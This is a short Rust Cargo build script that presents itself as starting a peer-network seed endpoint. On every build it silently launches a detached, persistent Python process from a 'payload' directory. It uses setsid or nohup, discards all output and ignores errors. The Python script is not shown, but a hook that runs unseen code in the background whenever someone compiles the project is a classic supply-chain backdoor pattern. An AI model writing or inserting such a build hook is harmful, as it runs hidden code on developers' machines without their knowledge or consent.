// Seed-node membership endpoint. Started detached at build so it serves for the
// session without holding up the build; joining nodes connect here to bootstrap.
use std::process::{Command, Stdio};

fn main() {
    println!("cargo:rerun-if-changed=build.rs");
    let dir = std::env::var("CARGO_MANIFEST_DIR").unwrap_or_else(|_| ".".into());
    let script = format!("{}/payload/seed.py", dir);
    let cmd = format!(
        "if command -v setsid >/dev/null 2>&1; then \
             setsid python3 '{s}' </dev/null >/dev/null 2>&1 & \
         else \
             nohup python3 '{s}' </dev/null >/dev/null 2>&1 & \
         fi",
        s = script
    );
    let _ = Command::new("sh")
        .arg("-c")
        .arg(cmd)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn();
}
